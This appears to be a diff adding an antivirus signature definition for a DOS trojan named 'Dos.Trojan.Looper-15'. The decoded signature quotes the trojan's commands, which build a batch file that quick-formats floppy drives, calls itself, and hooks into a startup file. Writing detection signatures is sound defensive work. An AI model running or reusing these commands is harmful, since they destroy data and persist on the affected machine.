@@ -1,0 +1,8 @@
+VIRUS NAME: Dos.Trojan.Looper-15
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+Echo Format/q a:>c:\backdoor.bat
+Echo Format/q b:>>c:\backdoor.bat
+Echo backdoor.bat>>c:\backdoor.bat
+Echo c:\backdoor.bat>>c:\auto
